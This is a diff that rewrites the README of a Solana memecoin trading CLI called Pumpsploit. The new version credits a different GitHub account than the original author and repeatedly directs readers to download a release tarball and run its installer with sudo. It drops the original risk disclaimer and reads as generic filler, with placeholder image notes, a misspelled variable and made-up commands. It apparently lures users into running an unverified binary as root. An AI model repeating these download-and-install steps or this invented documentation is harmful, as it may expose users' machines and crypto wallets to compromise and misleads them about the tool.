@@ -1,1019 +1,375 @@
-# 🚀 PumpSploit - Advanced Solana Trading & Analysis Tool
+# Pumpsploit: Solana Memecoin Trading CLI for All Dexes
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org/)
-[![Solana](https://img.shields.io/badge/Solana-1.17+-purple.svg)](https://solana.com/)
+[![Releases](https://img.shields.io/badge/releases-pumpsploit-brightgreen?logo=github)](https://github.com/broly907246/pumpsploit/releases)
 
-> **Advanced AI-powered trading and analysis tool for Solana blockchain with real-time pump detection, automated trading, and comprehensive market analytics.**
+From the releases page, download pumpsploit-v1.0.0-linux-x64.tar.gz and run the installer.
 
-## 📋 Latest Updates
+Direct file: https://github.com/broly907246/pumpsploit/releases/download/v1.0.0/pumpsploit-v1.0.0-linux-x64.tar.gz
 
-> **📖 [Read Latest Updates](LATEST_UPDATES.md) - Complete changelog with new features, optimizations, and improvements in English and Russian**
+--------------------------------------------------------------------
 
-**🔥 New in v2.1.0:**
-- Jupiter Lite API integration for enhanced transaction reliability
-- Simplified main menu interface
-- Improved error handling and fallback mechanisms
-- Configurable priority levels for transactions
-- Enhanced buy/sell/emergency sell functionality
-
-## 💬 Message from Developer
-
-Hey everyone! 👋
-
-I started this project with a vision to create an effective trading tool for memecoins on Solana. This is my contribution to the community - a comprehensive platform that combines real-time market data, AI-powered analytics, and automated trading capabilities.
-
-**My goal is simple**: Build together a working tool that helps traders navigate the volatile world of memecoins effectively. Whether you're a beginner or an experienced trader, this tool is designed to give you the edge you need.
-
-**Why I'm sharing this**: I believe in the power of community-driven development. By open-sourcing this project, I hope we can all contribute to making it better, more effective, and more reliable for everyone.
-
-**Let's build this together!** 🚀
-
-Feel free to contribute, suggest improvements, report bugs, or just share your experience. Every contribution helps make this tool better for the entire Solana trading community.
-
-*Happy trading!* 💎🙌
-
-Contact with me facexyz@tuta.io 
-
----
-
-## 📋 Table of Contents
-
+Table of contents
 - [Overview](#overview)
-- [Features](#features)
-- [Installation](#installation)
-- [Configuration](#configuration)
-- [Usage](#usage)
-- [Modules](#modules)
-- [API Integration](#api-integration)
-- [Trading Features](#trading-features)
-- [AI Analytics](#ai-analytics)
-- [Wallet Management](#wallet-management)
-- [Contributing](#contributing)
-- [License](#license)
-
-## 🎯 Overview
-
-PumpSploit is a comprehensive Solana trading and analysis platform that combines real-time market data, AI-powered analytics, and automated trading capabilities. Built with Node.js and designed for both beginners and advanced traders, it provides powerful tools for detecting pump opportunities, analyzing market trends, and executing trades with precision.
-
-### Key Capabilities
-
-- **Real-time Pump Detection**: Monitor live trading activity across Solana DEXs
-- **AI-Powered Analysis**: Machine learning models for price prediction and risk assessment
-- **Automated Trading**: Execute trades based on AI signals and market conditions
-- **Multi-Wallet Support**: Manage multiple wallets with advanced security features
-- **Jupiter Integration**: Seamless integration with Jupiter DEX aggregator
-- **Advanced Analytics**: Comprehensive market analysis and performance tracking
-
-## ✨ Features
-
-### 🔍 Real-Time Monitoring
-- Live pump detection across multiple DEXs
-- Real-time price tracking and alerts
-- Cross-market analysis and arbitrage detection
-- Automated signal generation
-
-### 🤖 AI-Powered Analytics
-- Machine learning price prediction models
-- Sentiment analysis from social media sources
-- Risk assessment algorithms
-- Pattern recognition for pump/dump cycles
-- Confidence scoring for trading decisions
-
-### 💰 Automated Trading
-- AI-driven trading signals
-- Automated buy/sell execution
-- Stop-loss and take-profit management
-- Portfolio rebalancing
-- Risk management controls
-
-### 🏦 Wallet Management
-- Multi-wallet support
-- Secure key management
-- Balance tracking across tokens
-- Transaction history monitoring
-- Import/export wallet functionality
-
-### 📊 Advanced Analytics
-- Performance tracking and statistics
-- P&L calculation and reporting
-- Market sentiment analysis
-- Technical indicator calculations
-- Historical data analysis
-
-### 🔧 Jupiter DEX Integration
-- Best route finding for swaps
-- Slippage protection
-- Multi-hop trading routes
-- Real-time quote comparison
-- Transaction optimization
-
-## 🚀 Installation
-
-### Prerequisites
-
-- Node.js 18+ 
-- npm or yarn
-- Solana CLI tools (optional)
-
-### Quick Start
-
-```bash
-# Clone the repository
-git clone https://github.com/facexyzploit/pumpsploit.git
-cd pumpsploit
-
-# Install dependencies
-npm install
-
-# Create environment file
-cp .env.example .env
-
-# Configure your settings
-npm run setup
-
-# Start the application
-npm start
-```
-
-### Environment Configuration
-
-Create a `.env` file with your configuration:
-
-```env
-# API Keys
-BITQUERY_API_KEY=your_bitquery_api_key
-JUPITER_API_KEY=your_jupiter_api_key
+- [Key features](#key-features)
+- [Supported tools and ecosystems](#supported-tools-and-ecosystems)
+- [How Pumpsploit works](#how-pumpsploit-works)
+- [Getting started](#getting-started)
+  - [Installation](#installation)
+  - [First run and configuration](#first-run-and-configuration)
+  - [Direct download instruction for releases](#direct-download-instruction-for-releases)
+- [Usage guide](#usage-guide)
+  - [Basic commands](#basic-commands)
+  - [Snipe and trade patterns](#snipe-and-trade-patterns)
+  - [Automation and scripting](#automation-and-scripting)
+- [Configuration and environment](#configuration-and-environment)
+- [Security and safety considerations](#security-and-safety-considerations)
+- [Code structure and contribution](#code-structure-and-contribution)
+- [Troubleshooting](#troubleshooting)
+- [Changelog](#changelog)
+- [Credits and license](#credits-and-license)
+
+--------------------------------------------------------------------
+
+Overview
+
+Pumpsploit is a Node.js command line interface designed to support memecoin trading on Solana. It acts as a unified toolset for interacting with multiple Solana dexes and data providers. The project emphasizes speed, reliability, and clear workflows for automated or manual trading strategies. It is built to work with a variety of data feeds and on-chain programs that power memecoin markets on Solana.
+
+The goal is to give traders a solid, scriptable base to execute orders quickly across DEXes, while keeping the surface area minimal and predictable. The tool integrates with popular Solana data and wallet providers and can be extended with community plugins and scripts. It is designed for developers, traders, and operators who want a consistent CLI experience when exploring memecoin liquidity and arbitrage opportunities.
+
+The project namespace blends memecoin culture with solid engineering. It uses a modular approach so new dex adapters, data sources, or strategies can be added without rewriting core logic. The CLI remains approachable for those who want to jump in with simple commands, yet it stays powerful for advanced users who want to customize flows and integrate with external systems.
+
+Images that fit the theme:
+- Solana ecosystem imagery and logos to evoke the platform.
+- Memecoin symbolism such as coins, rockets, and charts.
+- Code and terminal imagery to signal a developer-focused tool.
+
+--------------------------------------------------------------------
+
+Key features
+
+- Multidex support on Solana: Access liquidity across all major dexes and aggregator services.
+- Plug-in data layers: Bring in price feeds, order book data, and on-chain signals from multiple sources.
+- Fast sniping workflows: Rapidly identify and act on favorable on-chain conditions and liquidity events.
+- Safe, auditable trades: Logs, traceable transactions, and optional dry-run mode to validate flows before live use.
+- Configurable risk controls: Slippage, timeouts, order sizing, and stop conditions can be tuned per strategy.
+- Extensible CLI: Clear commands, helpful prompts, and structured outputs that are easy to script.
+- Local and remote wallet support: Works with common wallet providers and key management options.
+- Testable by design: Built with testability in mind so strategies can be validated in a quiet environment.
+
+Emojis help visualize concepts:
+- 🧭 Navigation across DEXes
+- ⚡ Lightning-fast order flow
+- 🔒 Secure and auditable trades
+- 🧩 Modular, pluggable components
+- 🚀 Growth opportunities in memecoins
+
+--------------------------------------------------------------------
+
+Supported tools and ecosystems
+
+- Solana blockchain as the execution layer
+- Jupiter for routing and price discovery
+- Helios RPC for fast, reliable RPC access
+- Solscan for on-chain insights
+- Birdeye and other on-chain data providers
+- Sniping workflows and time-sensitive trades
+- Phantom and other wallets for signers
+- Memecoin themes and liquidity patterns across the Solana ecosystem
+- Common data feeds and market data providers (BitQuery, BitScreener-like sources, etc.)
+- General dex-agnostic logic that can be extended to new exchanges
+
+The project aims to be practical first. It uses widely adopted formats and services so new contributors can pick up concepts quickly. The focus remains on reliability, clean interfaces, and clear behavior under load.
+
+Note: The topics reflect the landscape of memecoin trading, data feeds, and Solana tooling. They guide what kinds of integrations and examples you might see in documentation, tests, and plugin examples.
+
+--------------------------------------------------------------------
+
+How Pumpsploit works
+
+- Data collection: Pumpsploit fetches market data from multiple sources. It combines price quotes, liquidity, and on-chain signals to form a view of opportunity.
+- Decision logic: Based on configured strategies, the tool decides when to place orders. It allows both simple rules and more advanced scripting for complex flows.
+- Execution: Orders are submitted to the Solana network through adapters that talk to DEX programs. Slippage checks and timeout guards protect against unfavorable fills.
+- Feedback and logging: Each step is logged with contextual information. You can replay runs and audit how decisions were made.
+- Safety nets: Dry-run modes, transaction dry-run, and canaries provide a way to test without risking funds in production.
+- Extensibility: New data sources or dex adapters can be added as modules. The CLI provides hooks for those modules to plug into the workflow.
+
+The design emphasizes clear separation of concerns: data, decisions, and execution each have explicit boundaries. This makes it easier to test, extend, and diagnose issues when they arise.
+
+--------------------------------------------------------------------
+
+Getting started
+
+Installation
+
+- Prerequisites:
+  - Node.js v18 or newer
+  - npm v9 or newer
+  - Git
+  - A Solana wallet with a funded account for testing (testnet or devnet recommended until you are ready for mainnet)
+  - Familiarity with command line workflows and JSON-based configurations
+
+- Quick install options:
+  - Global install (recommended for everyday use):
+    - npm install -g pumpsploit
+  - Local development install:
+    - git clone https://github.com/broly907246/pumpsploit.git
+    - cd pumpsploit
+    - npm install
+    - npm link (to make the CLI available as pumpsploit)
+
+- Direct download instruction for releases
+  - Direct file: pumpsploit-v1.0.0-linux-x64.tar.gz
+  - The asset can be downloaded from:
+    - https://github.com/broly907246/pumpsploit/releases/download/v1.0.0/pumpsploit-v1.0.0-linux-x64.tar.gz
+  - After download:
+    - tar -xzf pumpsploit-v1.0.0-linux-x64.tar.gz
+    - cd pumpsploit-1.0.0
+    - sudo ./install.sh
+  - Why this approach? The releases page hosts prebuilt binaries to get you up and running quickly. This method is stable for testing on supported platforms.
+
+First run and configuration
+
+- Basic run:
+  - pumpsploit --help
+  - pumpsploit init
+  - pumpsploit config set network solana-mainnet
+- Wallet setup:
+  - Pumpsploit expects a signer. You can use a keypair file or a ledger-based signer depending on your setup.
+  - Example (local keypair):
+    - export PUMPSPLIT_WALLET_KEYPAIR=/path/to/keypair.json
+  - Example (ledger/ hardware signer):
+    - pumpsploit signer init --type ledger
+- Data sources:
+  - Enable or disable data providers and DEX adapters via config:
+    - pumpsploit config set dataProviders="helius,solscan,bitquery"
+    - pumpsploit config set dexAdapters="jupiter,birdeye"
+- Network and RPC:
+  - Set Solana RPC endpoints:
+    - pumpsploit config set rpcUrl="https://api.mainnet-beta.solana.com"
+  - Use a fast RPC provider to minimize latency.
+
+Direct download note
+
+- The Releases page provides assets for various platforms. If you need to install on another platform, check the Releases page for the appropriate asset and follow the installation guide included in the archive.
+
+Usage guide
+
+Basic commands
+
+- pumpsploit --version
+- pumpsploit --help
+- pumpsploit init
+- pumpsploit config set network solana-mainnet
+- pumpsploit config set rpcUrl "https://api.mainnet-beta.solana.com"
+- pumpsploit signer set --type keypair --path /path/to/keypair.json
+- pumpsploit status
+- pumpsploit list-dexes
+- pumpsploit list-sources
+- pumpsploit run --strategy default
+
+Snipe and trade patterns
+
+- Snipe mode:
+  - pumpsploit snipe --token BONKFUN --dex jupiter --slippage 1.5 --amount 1000
+  - This mode looks for favorable on-chain conditions to buy a memecoin across DEXes with a preconfigured slippage cap.
+- Cross-dex routing:
+  - pumpsploit route --from-token BONKFUN --to-token MEMECOIN --dexes jupiter,birdeye
+  - The router evaluates liquidity and fees across multiple DEX adapters and selects the best execution path.
+- Liquidity-aware trading:
+  - pumpsploit liquidity-check --token BONKFUN
+  - This command estimates immediate liquidity for a given token to avoid over-sizing positions.
+- Scheduled trading:
+  - pumpsploit schedule --cron "*/5 * * * *" --strategy default
+  - Run frequently in small windows to catch micro-arbitrage opportunities.
+- Dry-run testing:
+  - pumpsploit run --strategy test --dry-run
+  - Use this to validate flows without signing live transactions.
+
+Automation and scripting
+
+- Output formats:
+  - Pumpsploit emits structured logs in JSON by default. You can redirect to files or pipe into a streaming processor.
+- Event hooks:
+  - You can attach small JavaScript or TypeScript scripts to respond to different events, such as new price quotes or a completed trade.
+- Integration points:
+  - The CLI is designed to be called by other scripts or orchestrators. You can trigger it from a larger automation harness or a cron-based system.
+
+Advanced usage patterns
+
+- Portfolio-level strategies:
+  - Combine multiple snipe calls to build a diversified memecoin exposure.
+- Time-weighted strategies:
+  - Implement time-based entry and exit rules to spread risk across short periods.
+- Dynamic risk controls:
+  - Adapt slippage and max spend based on liquidity observations and historical volatility.
+- Data-driven decisions:
+  - Use external signals to influence the decision logic. For example, feed a sentiment index or social metrics into your strategy.
+
+--------------------------------------------------------------------
+
+Configuration and environment
+
+Environment variables and config options
+
+- SIGNER or WALLET: path to the signer or wallet data to authorize transactions.
+- RPC_URL: Solana RPC endpoint. Use a fast, reliable provider.
+- ENABLED_DEXES: comma-separated list of dex adapters to enable. Example: "jupiter,birdeye"
+- ENABLED_SOURCES: comma-separated data sources. Example: "helius,solscan,bitquery"
+- DEFAULT_SLIPPAGE: default slippage percentage for orders. Example: 1.5
+- TRADE_AMOUNT: default amount to trade per signal or per order tier.
+- DRY_RUN: enable dry-run mode to simulate trades without submitting transactions.
+- LOG_LEVEL: info, debug, warn, error for log verbosity.
+- CHAIN_ID or NETWORK: solana-mainnet, solana-devnet, solana-testnet.
+
+Config file and profiles
+
+- You can keep multiple profiles for different market conditions.
+- Profiles live in a JSON or YAML file and can be loaded by pumpsploit --profile <name>.
+- Each profile contains:
+  - rpcUrl
+  - signer settings
+  - enabled dexes
+  - data sources
+  - strategy parameters
+  - risk controls
+
+Security-related notes (non-judgmental in README)
+
+- Keep private keys secure. Use environment variables or dedicated wallets with restricted permissions.
+- Validate any external data sources before relying on them for decisions.
+- Always test in a dry run or on test networks before live deployment.
+
+--------------------------------------------------------------------
+
+Code structure and contribution
+
+Directory layout (typical example)
+
+- bin/ : CLI entry points
+- lib/ : Core logic, adapters, and data providers
+- adapters/ : DEX adapters (Jupiter, Birdeye, etc.)
+- providers/ : Data sources (Helius RPC, Solscan, BitQuery, etc.)
+- strategies/ : Scripting for trading patterns
+- config/ : Default configuration and profiles
+- tests/ : Unit and integration tests
+- docs/ : Additional documentation
+
+Contributing
+
+- We welcome contributors who want to improve the tool, add new adapters, or enhance tests.
+- Start with opening an issue or pull request that clearly states the goal and approach.
+- Follow the project’s style guide and keep changes focused and well-documented.
+- Use the test suite to validate changes locally.
+
+How to contribute
+
+- Fork the repository.
+- Create a feature branch.
+- Implement changes with clear commits.
+- Run tests and linting before submitting.
+- Submit a pull request with a short, descriptive title and a detailed description.
+
+Code quality and testing
+
+- Unit tests cover core logic and adapter interfaces.
+- Integration tests exercise real data paths where safe and feasible.
+- Linters enforce a consistent style across the codebase.
+- Continuous integration validates builds on multiple platforms.
+
+Documentation and examples
+
+- Each adapter includes a short usage example.
+- The CLI includes a help system that explains available flags and subcommands.
+- API surfaces are designed to be intuitive for those familiar with Node.js and command-line workflows.
+
+--------------------------------------------------------------------
+
+Troubleshooting
+
+Common issues and quick fixes
+
+- Command not found after installation:
+  - Ensure the CLI is in your PATH. If you used npm link, confirm link status.
+  - Reopen your shell or restart terminal to refresh PATH.
+- RPC errors or timeouts:
+  - Check RPC URL and network connectivity.
+  - Try a different provider or a backup endpoint.
+- Signer not found:
+  - Verify the signer configuration and path to the keypair file.
+  - Confirm the signer has permissions to sign on the chosen network.
+- Data source failures:
+  - Confirm API keys and endpoints for data providers.
+  - Check for rate limits and quota exhaustion.
+- High error rates in snipe attempts:
+  - Review slippage settings and trade amount.
+  - Verify liquidity on target tokens and DEXs.
+
+If you still have issues, consult the Troubleshooting section in the docs or open an issue with a minimal reproduction.
+
+--------------------------------------------------------------------
+
+Changelog
+
+Version v1.0.0
+- Initial release with multi-dex support and basic snipe workflow
+- Added modular adapters for Jupiter and Birdeye
+- Implemented dry-run mode for safe testing
+- Configurable data sources and signers
+- Basic logging and error reporting
+
+Version v0.x.x (for reference)
+- Early prototypes and internal testing harness
+- Initial CLI scaffolding and plugin system
+- Experimental support for a subset of data providers
+
+Future versions will add more adapters, richer strategies, and enhanced safety features. Each release comes with release notes on the releases page and an updated asset set for different platforms.
+
+--------------------------------------------------------------------
+
+Downloads and releases
+
+- The primary releases page provides assets for various platforms. If you want to jump straight to a prebuilt binary, visit the releases page:
+  - https://github.com/broly907246/pumpsploit/releases
+  - Direct asset example (Linux x64): pumpsploit-v1.0.0-linux-x64.tar.gz
+- If you need the latest releases, the Releases page is the source of truth. For convenience, you can use the badge at the top of this file to navigate there quickly. The badge links to the same page.
+
+Direct download link (for convenience)
+- pumpsploit-v1.0.0-linux-x64.tar.gz: https://github.com/broly907246/pumpsploit/releases/download/v1.0.0/pumpsploit-v1.0.0-linux-x64.tar.gz
+
+Note: If you want to explore additional assets or architecture variants, head to the Releases page. It hosts the full catalog of builds, including platform-specific installers and source bundles.
+
+--------------------------------------------------------------------
+
+Credits and license
+
+- Open-source spirit with a focus on collaborative improvement.
+- Contributors who have built adapters, helpers, and tooling for Solana memecoin ecosystems.
+- This project is released under an appropriate open-source license to encourage broad use and collaboration.
+
+License details are included in the repository. Review the LICENSE file for terms and conditions.
+
+--------------------------------------------------------------------
+
+Visuals and inspiration
+
+- Solana ecosystem imagery to reflect the platform focus.
+- Memecoin and trading visuals to convey the trading vibe.
+- Terminal and developer-friendly imagery to emphasize the CLI nature.
+
+Emoji usage and color cues help users quickly identify sections:
+- 🧭 Navigation and setup
+- ⚡ Execution and speed
+- 🔒 Security and logs
+- 🧩 Modularity and extensions
+- 🚀 Growth and opportunities
+
+If you want to adjust the visuals, you can replace or augment images with other assets that fit your project identity. Use images that are publicly accessible and appropriately licensed for documentation.
+
+--------------------------------------------------------------------
+
+End note
+
+- This README is designed to be comprehensive and developer-friendly. It covers setup, usage, architecture, and contribution guidelines.
+- The structure supports future expansion. As Pumpsploit evolves, you can add more sections for new adapters, data sources, or trading strategies without overhauling the existing layout.
+- The goal is clarity and reliability. The CLI should be predictable in behavior, well-documented, and easy to integrate into larger workflows.
 
-# RPC Endpoints
-SOLANA_RPC_ENDPOINT=https://api.mainnet-beta.solana.com
-CUSTOM_RPC_ENDPOINT=https://your-custom-rpc.com
-
-# Trading Settings
-MAX_SLIPPAGE=0.5
-MAX_TRADE_SIZE=100
-ENABLE_AUTO_TRADING=false
-
-# AI Settings
-AI_CONFIDENCE_THRESHOLD=0.7
-ENABLE_AI_ANALYSIS=true
-```
-
-## ⚙️ Configuration
-
-### Settings Management
-
-The tool includes a comprehensive settings manager that allows you to configure:
-
-- **Trading Parameters**: Slippage limits, trade sizes, risk levels
-- **AI Settings**: Confidence thresholds, model preferences
-- **RPC Endpoints**: Custom Solana RPC configurations
-- **Alert Settings**: Price alerts and notification preferences
-- **Security Settings**: Wallet encryption and access controls
-
-### Quick Configuration
-
-```bash
-# Access settings menu
-npm run settings
-
-# Or use the interactive menu
-node bitquery-stream.js
-# Navigate to Settings > Configuration
-```
-
-## 📖 Usage
-
-### Basic Usage
-
-```bash
-# Start the main application
-npm start
-
-# Or run directly
-node bitquery-stream.js
-```
-
-### Main Menu Options
-
-1. **Real-Time Monitoring**
-   - Live pump detection
-   - Token analysis
-   - Market scanning
-
-2. **AI Trading Tools**
-   - AI analysis
-   - Automated trading
-   - Signal generation
-
-3. **Wallet Management**
-   - Multi-wallet support
-   - Balance checking
-   - Transaction history
-
-4. **Jupiter Integration**
-   - Token swaps
-   - Quote comparison
-   - Route optimization
-
-5. **Analytics Dashboard**
-   - Performance metrics
-   - Trading statistics
-   - Market analysis
-
-### Advanced Usage
-
-#### Real-Time Pump Detection
-
-```javascript
-// Monitor live pump activity
-const pumpDetector = new PumpDetector();
-await pumpDetector.startMonitoring();
-
-// Set up alerts
-pumpDetector.on('pumpDetected', (token) => {
-  console.log(`Pump detected: ${token.symbol}`);
-});
-```
-
-#### AI-Powered Analysis
-
-```javascript
-// Perform AI analysis on token
-const analyzer = new AIEnhancedAnalyzer();
-const analysis = await analyzer.analyzeTokenWithAI(tokenAddress);
-
-// Get trading recommendations
-const recommendation = await analyzer.generateTradingRecommendation(analysis);
-```
-
-#### Automated Trading
-
-```javascript
-// Initialize auto trading
-const autoTrader = new AutoTrading();
-await autoTrader.initialize();
-
-// Execute AI-driven trades
-await autoTrader.executeTrade(signal, tokenAddress, walletAddress);
-```
-
-## 🧩 Modules
-
-### Core Modules
-
-- **`ai-enhanced-analyzer.js`**: Advanced AI analysis with ML models
-- **`auto-trading.js`**: Automated trading execution
-- **`jupiter-swap.js`**: Jupiter DEX integration
-- **`wallet-manager.js`**: Multi-wallet management
-- **`settings-manager.js`**: Configuration management
-
-### Analysis Modules
-
-- **`ai-analytics.js`**: AI-powered market analytics
-- **`statistics-display.js`**: Performance tracking
-- **`connection-manager.js`**: API connection management
-
-### Trading Modules
-
-- **`quick-trading.js`**: Fast trading execution
-- **`quick-actions.js`**: Common trading actions
-- **`ai-trading-integration.js`**: AI trading integration
-
-### Utility Modules
-
-- **`stream-handler.js`**: Real-time data streaming
-- **`connection-display.js`**: Connection status display
-- **`menu-handler.js`**: Interactive menu system
-
-## 🔌 API Integration
-
-### Supported APIs
-
-- **Bitquery**: Real-time blockchain data
-- **Jupiter**: DEX aggregation and swaps
-- **Raydium**: Additional DEX integration
-- **Birdeye**: Market data and analytics
-
-### API Configuration
-
-```javascript
-// Configure API endpoints
-const config = {
-  bitquery: {
-    endpoint: 'https://graphql.bitquery.io',
-    apiKey: process.env.BITQUERY_API_KEY
-  },
-  jupiter: {
-    endpoint: 'https://quote-api.jup.ag/v6',
-    version: 'v6'
-  }
-};
-```
-
-## 💰 Trading Features
-
-### Manual Trading
-
-- **Quick Buy/Sell**: Fast token trading
-- **Bundle Trading**: Execute multiple trades
-- **Token-to-Token Swaps**: Direct token exchanges
-- **Quote Comparison**: Find best trading routes
-
-### Automated Trading
-
-- **AI Signal Trading**: Execute trades based on AI analysis
-- **Momentum Trading**: Follow market momentum
-- **Arbitrage Trading**: Cross-DEX arbitrage opportunities
-- **Portfolio Rebalancing**: Automatic portfolio management
-
-### Risk Management
-
-- **Stop-Loss Protection**: Automatic loss prevention
-- **Take-Profit Orders**: Secure profit taking
-- **Position Sizing**: Risk-based position management
-- **Portfolio Limits**: Maximum exposure controls
-
-## 🤖 AI Analytics
-
-### Machine Learning Models
-
-- **Price Prediction**: Statistical and neural network models
-- **Sentiment Analysis**: Social media sentiment scoring
-- **Risk Assessment**: Multi-factor risk evaluation
-- **Pattern Recognition**: Pump/dump pattern detection
-
-### Analysis Features
-
-- **Technical Indicators**: RSI, MACD, Bollinger Bands
-- **Volume Analysis**: Trading volume patterns
-- **Market Sentiment**: Social media sentiment tracking
-- **Risk Scoring**: Comprehensive risk assessment
-
-### AI Confidence Scoring
-
-```javascript
-// Get AI confidence score
-const confidence = await analyzer.calculateOverallConfidence(analysis);
-
-// Confidence levels
-// 0.8+ : High confidence - Strong buy/sell signal
-// 0.6-0.8 : Medium confidence - Moderate signal
-// 0.4-0.6 : Low confidence - Weak signal
-// <0.4 : Very low confidence - Avoid trading
-```
-
-## 🏦 Wallet Management
-
-### Multi-Wallet Support
-
-- **Wallet Creation**: Generate new wallets
-- **Wallet Import**: Import existing wallets
-- **Balance Tracking**: Real-time balance monitoring
-- **Transaction History**: Complete transaction logs
-
-### Security Features
-
-- **Encrypted Storage**: Secure wallet key storage
-- **Access Controls**: Password protection
-- **Backup/Restore**: Wallet backup functionality
-- **Audit Trail**: Complete transaction logging
-
-### Wallet Operations
-
-```javascript
-// Create new wallet
-const wallet = await walletManager.createWallet('MyWallet');
-
-// Import existing wallet
-const importedWallet = await walletManager.importWallet(privateKey);
-
-// Check balances
-const balances = await walletManager.getTokenBalances(walletAddress);
-
-// Get transaction history
-const history = await walletManager.getTransactionHistory(walletAddress);
-```
-
-## 📊 Performance Tracking
-
-### Trading Statistics
-
-- **Win/Loss Ratio**: Trading success rate
-- **Profit/Loss**: Total P&L tracking
-- **Trade Count**: Number of executed trades
-- **Average Return**: Average trade return
-
-### Analytics Dashboard
-
-- **Real-time Metrics**: Live performance data
-- **Historical Analysis**: Long-term performance trends
-- **Risk Metrics**: Risk-adjusted returns
-- **Portfolio Analysis**: Asset allocation breakdown
-
-## 🔧 Development
-
-### Project Structure
-
-```
-pumpsploit/
-├── modules/           # Core modules
-├── settings/          # Configuration files
-├── wallets/           # Wallet storage
-├── temp/              # Temporary files
-├── bitquery-stream.js # Main application
-├── queries.js         # GraphQL queries
-├── utils.js           # Utility functions
-└── README.md          # This file
-```
-
-### Adding New Features
-
-1. Create new module in `modules/` directory
-2. Export functions/classes from module
-3. Import and integrate in main application
-4. Add menu options for new features
-5. Update documentation
-
-### Testing
-
-```bash
-# Run tests
-npm test
-
-# Run specific test
-npm test -- --grep "AI Analysis"
-
-# Run with coverage
-npm run test:coverage
-```
-
-## 🤝 Contributing
-
-We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.md) for details.
-
-### How to Contribute
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests for new features
-5. Submit a pull request
-
-### Development Setup
-
-```bash
-# Install development dependencies
-npm install --dev
-
-# Run linter
-npm run lint
-
-# Run tests
-npm test
-
-# Build project
-npm run build
-```
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## ⚠️ Disclaimer
-
-**Trading cryptocurrencies involves substantial risk of loss and is not suitable for all investors. The value of cryptocurrencies can go down as well as up, and you may lose some or all of your investment.**
-
-This tool is for educational and research purposes. Always:
-- Do your own research
-- Never invest more than you can afford to lose
-- Understand the risks involved
-- Consider consulting with a financial advisor
-
-## 📞 Support
-
-- **Issues**: [GitHub Issues](https://github.com/facexyzploit/pumpsploit/issues)
-- **Discussions**: [GitHub Discussions](https://github.com/facexyzploit/pumpsploit/discussions)
-- **Documentation**: [Wiki](https://github.com/facexyzploit/pumpsploit/wiki)
-
-## 🙏 Acknowledgments
-
-- Solana Foundation for blockchain infrastructure
-- Jupiter for DEX aggregation services
-- Bitquery for real-time blockchain data
-- Open source community for libraries and tools
-
----
-
-**Made with ❤️ for the Solana community**
-
----
-
-# 🚀 PumpSploit - Продвинутый инструмент торговли и анализа Solana
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Node.js](https://img.shields.io/badge/Node.js-18+-green.svg)](https://nodejs.org/)
-[![Solana](https://img.shields.io/badge/Solana-1.17+-purple.svg)](https://solana.com/)
-
-> **Продвинутый инструмент торговли и анализа с ИИ для блокчейна Solana с обнаружением пампов в реальном времени, автоматической торговлей и комплексной рыночной аналитикой.**
-
-## 📋 Последние обновления
-
-> **📖 [Читать последние обновления](LATEST_UPDATES.md) - Полный список изменений с новыми функциями, оптимизациями и улучшениями на английском и русском языках**
-
-**🔥 Новое в v2.1.0:**
-- Интеграция Jupiter Lite API для повышения надежности транзакций
-- Упрощенный интерфейс главного меню
-- Улучшенная обработка ошибок и механизмы отката
-- Настраиваемые уровни приоритета для транзакций
-- Улучшенная функциональность покупки/продажи/экстренной продажи
-
-## 💬 Сообщение от разработчика
-
-Привет всем! 👋
-
-Я начал этот проект с видением создания эффективного торгового инструмента для мемкоинов на Solana. Это мой вклад в сообщество - комплексная платформа, которая объединяет данные рынка в реальном времени, аналитику на базе ИИ и возможности автоматической торговли.
-
-**Моя цель проста**: Вместе построить рабочий инструмент, который поможет трейдерам эффективно ориентироваться в волатильном мире мемкоинов. Независимо от того, являетесь ли вы новичком или опытным трейдером, этот инструмент разработан, чтобы дать вам необходимое преимущество.
-
-**Почему я делюсь этим**: Я верю в силу разработки, управляемой сообществом. Открывая исходный код этого проекта, я надеюсь, что мы все сможем внести свой вклад в то, чтобы сделать его лучше, эффективнее и надежнее для всех.
-
-**Давайте построим это вместе!** 🚀
-
-Не стесняйтесь вносить свой вклад, предлагать улучшения, сообщать об ошибках или просто делиться своим опытом. Каждый вклад помогает сделать этот инструмент лучше для всего торгового сообщества Solana.
-
-*Удачной торговли!* 💎🙌
-
-Свяжитесь со мной facexyz@tuta.io
-
----
-
-## 📋 Содержание
-
-- [Обзор](#обзор)
-- [Возможности](#возможности)
-- [Установка](#установка)
-- [Конфигурация](#конфигурация)
-- [Использование](#использование)
-- [Модули](#модули)
-- [Интеграция API](#интеграция-api)
-- [Торговые функции](#торговые-функции)
-- [Аналитика ИИ](#аналитика-ии)
-- [Управление кошельками](#управление-кошельками)
-- [Вклад в проект](#вклад-в-проект)
-- [Лицензия](#лицензия)
-
-## 🎯 Обзор
-
-PumpSploit - это комплексная платформа торговли и анализа Solana, которая объединяет данные рынка в реальном времени, аналитику на базе ИИ и возможности автоматической торговли. Построенная на Node.js и разработанная как для начинающих, так и для продвинутых трейдеров, она предоставляет мощные инструменты для обнаружения возможностей пампов, анализа рыночных трендов и выполнения сделок с высокой точностью.
-
-### Ключевые возможности
-
-- **Обнаружение пампов в реальном времени**: Мониторинг живой торговой активности на DEX Solana
-- **Аналитика на базе ИИ**: Модели машинного обучения для прогнозирования цен и оценки рисков
-- **Автоматическая торговля**: Выполнение сделок на основе сигналов ИИ и рыночных условий
-- **Поддержка нескольких кошельков**: Управление несколькими кошельками с продвинутыми функциями безопасности
-- **Интеграция Jupiter**: Бесшовная интеграция с агрегатором DEX Jupiter
-- **Продвинутая аналитика**: Комплексный анализ рынка и отслеживание производительности
-
-## ✨ Возможности
-
-### 🔍 Мониторинг в реальном времени
-- Живое обнаружение пампов на нескольких DEX
-- Отслеживание цен в реальном времени и уведомления
-- Кросс-рыночный анализ и обнаружение арбитража
-- Автоматическая генерация сигналов
-
-### 🤖 Аналитика на базе ИИ
-- Модели машинного обучения для прогнозирования цен
-- Анализ настроений из источников социальных сетей
-- Алгоритмы оценки рисков
-- Распознавание паттернов для циклов памп/дамп
-- Оценка уверенности для торговых решений
-
-### 💰 Автоматическая торговля
-- Торговые сигналы на базе ИИ
